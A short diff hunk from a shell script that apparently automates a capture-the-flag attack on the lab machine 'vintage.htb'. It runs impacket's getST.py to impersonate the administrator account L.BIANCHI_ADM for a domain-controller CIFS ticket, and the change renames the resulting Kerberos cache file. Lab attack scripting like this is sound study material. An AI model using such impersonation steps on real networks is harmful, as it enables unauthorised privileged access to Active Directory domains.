@@ -120,7 +120,7 @@ getST.py -dc-ip 10.10.11.45 -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_
 if [ $? -ne 0 ]; then
     print_error "getST.py failed for L.BIANCHI_ADM"
 fi
-export KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
+export KRB5CCNAME=L.BIANCHI_ADM.ccache
 print_success "Service Ticket for L.BIANCHI_ADM obtained and KRB5CCNAME set."
 echo
 
